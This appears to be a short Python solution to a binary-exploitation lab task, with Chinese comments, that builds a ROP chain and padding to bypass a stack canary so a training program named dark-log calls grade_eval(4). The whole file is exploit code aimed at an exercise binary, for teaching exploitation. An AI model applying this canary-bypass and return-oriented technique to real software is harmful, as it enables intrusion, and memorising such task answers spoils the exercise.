#!/usr/bin/env python3
"""Task 4: 绕过 Stack Canary，让 dark-log 调用 grade_eval(4)。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

chain  = p64(0x4018a3)
chain += p64(4)
chain += p64(0x4018b0)
chain += p64(0x401677)
chain += p64(0x4141414141414141)

payload  = chain.ljust(0x100, b"A")
payload += p32(0xa8)
assert len(payload) <= 0x117, "不能写进 0x118 处的 canary"

sys.stdout.buffer.write(payload)